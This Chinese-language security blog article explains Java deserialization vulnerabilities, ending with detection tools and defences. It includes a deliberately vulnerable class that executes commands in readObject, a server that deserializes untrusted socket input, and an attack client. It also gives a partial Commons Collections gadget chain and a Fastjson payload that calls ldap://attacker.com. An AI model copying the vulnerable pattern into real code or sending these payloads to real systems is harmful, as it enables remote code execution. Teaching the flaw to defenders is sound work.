#  一文读懂Java反序列化漏洞   
原创 deepsec  深安安全   2025-03-03 05:30  
  
> Java反序列化漏洞是一种常见的安全漏洞，广泛存在于Java应用程序中。由于Java的序列化和反序列化机制设计上的缺陷，攻击者可以通过构造恶意的序列化数据，在目标系统上执行任意代码，从而导致严重的安全问题。近年来，Java反序列化漏洞在Web应用、中间件（如Apache Tomcat、WebLogic、JBoss等）以及分布式系统中频繁出现，成为攻击者利用的热点漏洞之一。  
  
# 1.序列化与反序列化  
- **1.1 序列化**  
  
序列化（Serialization）是将对象转换为字节流的过程，以便将对象存储在文件中或通过网络传输，Java提供了java.io.Serializable接口来实现对象的序列化，示例代码：  
```
import java.io.*;

public class SerializationExample {
    public static void main(String[] args) throws IOException {
        // 创建一个对象
        User user = new User("admin", "password123");
        // 序列化对象
        try (FileOutputStream fileOut = new FileOutputStream("user.ser");
             ObjectOutputStream out = new ObjectOutputStream(fileOut)) {
            out.writeObject(user);
            System.out.println("对象已序列化并保存到 user.ser");
        }
    }
}

class User implements Serializable {
    private String username;
    private String password;
    public User(String username, String password) {
        this.username = username;
        this.password = password;
    }
}
```  
# 1.2 反序列化反序列化（Deserialization）是将字节流转换回对象的过程，Java通过ObjectInputStream类实现反序列化，示例代码：import java.io.*;public class DeserializationExample {    public static void main(String[] args) throws IOException, ClassNotFoundException {        // 反序列化对象        try (FileInputStream fileIn = new FileInputStream("user.ser");             ObjectInputStream in = new ObjectInputStream(fileIn)) {            User user = (User) in.readObject();            System.out.println("反序列化对象: " + user);        }    }}  
# 2.Java反序列化漏洞的原理  
- **2.1 漏洞成因**  
  
Java反序列化漏洞的核心问题在于：**反序列化过程的可控性：**攻击者可以构造恶意的序列化数据，控制反序列化过程中加载的类和方法。**危险方法的调用：**某些类在反序列化时会自动调用危险方法（如readObject、readResolve等），攻击者可以利用这些方法执行任意代码。**一个直观的比喻：你网购了一箱零食，签收时发现快递盒被重新封装过，里面藏着一个炸弹。这是因为黑客伪造了恶意快递包裹（篡改序列化数据），在包裹里藏入特殊"炸弹"（恶意代码），当程序拆封这个包裹时，会触发炸弹爆炸（执行任意代码）。**  
- **2.2 攻击方式**  
  
攻击者通常通过以下步骤利用反序列化漏洞：**构造恶意序列化数据：**利用已知的漏洞类（如Apache Commons Collections、JDK内部类等）构造恶意序列化数据。**发送恶意数据：**将恶意序列化数据发送到目标系统，例如通过HTTP请求、RMI协议、JMX接口等。**触发反序列化：**目标系统在反序列化恶意数据时，执行攻击者构造的恶意代码。  
- **2.3 漏洞样例**  
  
**①存在漏洞的类：**  
# import java.io.Serializable;import java.io.ObjectInputStream;import java.io.IOException;// 漏洞类：重写readObject()方法实现危险逻辑public class VulnerableObject implements Serializable {    private String command;    public VulnerableObject(String command) {        this.command = command;    }    // 反序列化时会自动调用此方法    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {        in.defaultReadObject(); // 默认反序列化        try {            // 危险操作：执行系统命令            Runtime.getRuntime().exec(this.command);        } catch (Exception e) {            e.printStackTrace();        }    }}  
  
**②漏洞服务端：**  
# import java.io.*;import java.net.ServerSocket;import java.net.Socket;public class VulnerableServer {    public static void main(String[] args) throws Exception {        try (ServerSocket server = new ServerSocket(8888)) {            System.out.println("Server started. Listening on port 8888...");            while (true) {                // 接收客户端连接                Socket socket = server.accept();                // 读取客户端发送的序列化数据                try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {                    // 反序列化触发漏洞                    ois.readObject();                    System.out.println("Object deserialized.");                } catch (Exception e) {                    e.printStackTrace();                }            }        }    }}  
  
**③攻击客户端：**  
# import java.io.*;import java.net.Socket;public class AttackerClient {    public static void main(String[] args) {        String serverIP = "localhost";        int port = 8888;        // 构造恶意对象：执行系统命令（例如打开计算器）        VulnerableObject maliciousObj = new VulnerableObject("calc.exe");        try (Socket socket = new Socket(serverIP, port);             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {            // 发送恶意序列化对象            oos.writeObject(maliciousObj);            System.out.println("Malicious object sent!");        } catch (Exception e) {            e.printStackTrace();        }    }}  
  
**④漏洞触发流程：**  
**启动服务端：**运行VulnerableServer，监听8888端口。**启动攻击者客户端：**运行AttackerClient，向服务端发送恶意序列化对象。**漏洞触发：**服务端反序列化数据时，自动调用VulnerableObject.readObject()，执行calc.exe弹出计算器。  
- **2.4 历史案例**  
  
**①Apache Commons Collections漏洞（CVE-2015-7501）**  
  
**影响范围：**  
3.1版本及以下**核心类：**InvokerTransformer, ChainedTransformer**利用代码：**  
# Transformer[] transformers = new Transformer[] {  new ConstantTransformer(Runtime.class),  new InvokerTransformer("getMethod", ...),  new InvokerTransformer("invoke", ...),  new InvokerTransformer("exec", ...)};  
  
**②Fastjson反序列化漏洞（CVE-2017-18349）**  
  
**漏洞根源：**  
autoType特性绕过**攻击方式：**构造恶意JSON利用JNDI注入**示例Payload：**  
# {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/exp"}  
# 3.漏洞检测与防御  
- **3.1 漏洞检测**  
  
**静态代码分析：**  
使用工具（如FindBugs、SonarQube）扫描代码，查找反序列化操作。**动态测试：**使用工具（如ysoserial、Burp Suite）生成恶意序列化数据，测试目标系统是否易受攻击。**日志监控：**监控反序列化操作的日志，查找异常行为。  
- **3.2 防御措施**  
  
**避免反序列化不可信数据：**  
不要反序列化来自不可信来源的数据。**使用白名单机制：**限制反序列化过程中可加载的类。**升级依赖库：**及时更新存在漏洞的第三方库（如Apache Commons Collections）。**使用安全的序列化框架：**例如Google的Protobuf、Kryo等。**启用安全管理器：**通过Java安全管理器（SecurityManager）限制反序列化操作的权限。  
# 4.总结  
  
Java反序列化漏洞是一种危害性极大的安全漏洞，广泛存在于Java应用程序中。由于其利用门槛低、影响范围广，开发者和安全团队需要高度重视。通过加强代码审计、升级依赖库、使用安全的序列化框架等措施，可以有效降低反序列化漏洞的风险。随着Java生态系统的不断发展，反序列化漏洞的利用方式和防御手段也在不断演进。建议开发者和安全研究人员持续关注相关漏洞动态，及时采取防护措施。  
  
  
  
